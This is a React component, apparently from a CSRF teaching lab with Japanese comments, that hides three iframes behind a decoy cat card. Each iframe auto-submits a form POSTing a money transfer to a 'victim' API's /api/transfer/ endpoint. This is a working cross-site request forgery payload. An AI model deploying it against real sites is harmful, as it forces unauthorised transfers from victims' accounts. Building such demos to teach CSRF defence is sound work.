import { useRef, useEffect, useState } from "react";
import { VICTIM_API_BASE, DEFAULT_TARGET, DEFAULT_AMOUNT } from "../config.js";

/**
 * ④ 不可視 iframe による継続攻撃
 *
 * SPA 単独でも、罠①と同じ仕組みを iframe 内の form で繰り返す。
 * ここでは React 側で 3 つの iframe をマウントし、
 * それぞれに「自動 submit する HTML」を srcDoc で埋め込む。
 */
export default function IframeTrap() {
  const action = `${VICTIM_API_BASE}/api/transfer/`;
  const html = `<!doctype html><html><body>
<form id="f" action="${action}" method="POST" enctype="application/x-www-form-urlencoded">
  <input name="to" value="${DEFAULT_TARGET}" />
  <input name="amount" value="${DEFAULT_AMOUNT}" />
</form>
<script>document.getElementById('f').submit();</script>
</body></html>`;

  return (
    <>
      <p>
        以下の「無害そうなコンテンツ」の裏で、罠①と同じ自動 submit を行う iframe が <strong>3 つ</strong>{" "}
        同時に動いている。 DevTools の Network タブで <code>POST /api/transfer/</code> が 複数回飛ぶことを確認できる。
      </p>

      <div className="card inner">
        <h3 style={{ marginTop: 0 }}>🐱 かわいい猫を見よう！</h3>
        <p>(本物の攻撃ページなら、ここに無害そうなコンテンツが置かれる)</p>
      </div>

      <HiddenSubmitFrame html={html} />
      <HiddenSubmitFrame html={html} />
      <HiddenSubmitFrame html={html} />
    </>
  );
}

function HiddenSubmitFrame({ html }) {
  return (
    <iframe
      title="hidden"
      srcDoc={html}
      sandbox="allow-forms allow-scripts allow-same-origin"
      style={{ display: "none" }}
    />
  );
}
